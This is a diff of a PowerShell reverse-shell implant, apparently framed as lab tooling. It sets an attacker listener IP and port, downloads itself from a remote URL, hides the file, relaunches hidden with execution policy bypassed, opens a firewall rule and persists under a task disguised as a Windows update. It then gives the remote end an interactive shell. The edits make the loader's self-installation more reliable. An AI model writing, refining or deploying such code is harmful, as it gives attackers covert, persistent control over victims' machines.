@@ -2,7 +2,7 @@
 $DebugMode = $true     # SET TO $false TO HIDE EVERYTHING
 $LHOST = "192.168.1.129" # Your listener IP
 $LPORT = 4444          # Your listener Port
-$WorkDir = "C:\Windows\Temp"
+$WorkDir = "C:\Win"
 $ScriptName = "service.ps1"
 $FullPath = Join-Path $WorkDir $ScriptName
 $TaskName = "WinUpdateMaintenance"
@@ -24,33 +24,25 @@ if (-not (Test-Path $WorkDir)) {
     New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
 }
 
-# Improved path detection for iex/remote execution
-$CurrentPath = $null
-if ($PSCommandPath) { 
-    $CurrentPath = $PSCommandPath 
-} elseif ($MyInvocation.MyCommand.Path) { 
-    $CurrentPath = $MyInvocation.MyCommand.Path 
-}
-
-# Check if we are running from the final destination
-if ($null -eq $CurrentPath -or $CurrentPath -ne $FullPath) {
-    Log-Debug "Not running from $WorkDir. Installing fresh copy from GitHub..."
+# Detection: If we aren't running the specific file in C:\Win, we install and hand off
+if ($PSCommandPath -ne $FullPath) {
+    Log-Debug "Loader detected. Installing to $FullPath..."
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        Invoke-WebRequest -Uri $RemoteUrl -OutFile $FullPath -UseBasicParsing -ErrorAction Stop
-        Log-Debug "Download successful: $FullPath"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($RemoteUrl, $FullPath)
+        Log-Debug "Download successful."
         
         if (-not $DebugMode) {
             attrib +h +s $FullPath
         }
 
-        Log-Debug "Spawning background process and releasing terminal..."
-        # Using Start-Process with -PassThru and null-routing output to prevent terminal hanging
-        $procArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
-        Start-Process powershell.exe -ArgumentList $procArgs -NoNewWindow:$false
+        Log-Debug "Launching background process..."
+        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
         
-        # Force a stop to the current script execution to return the prompt to the user
-        return 
+        Log-Debug "Releasing terminal. Process will continue in background."
+        # Force terminate the loader session to prevent terminal hang
+        Stop-Process -Id $PID 
     } catch {
         Log-Debug "Installation failed: $($_.Exception.Message)"
     }
@@ -66,7 +58,7 @@ try {
         New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
     }
 } catch {
-    Log-Debug "System mods failed (Check Admin rights)."
+    Log-Debug "System mods skipped or failed (Requires Admin)."
 }
 
 # 3. PERSISTENCE
@@ -107,7 +99,7 @@ while ($true) {
 
         $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
         $writer.WriteLine("--- Identity: $(whoami) ---")
-        $writer.WriteLine("--- File Path: $FullPath ---")
+        $writer.WriteLine("--- Path: $FullPath ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
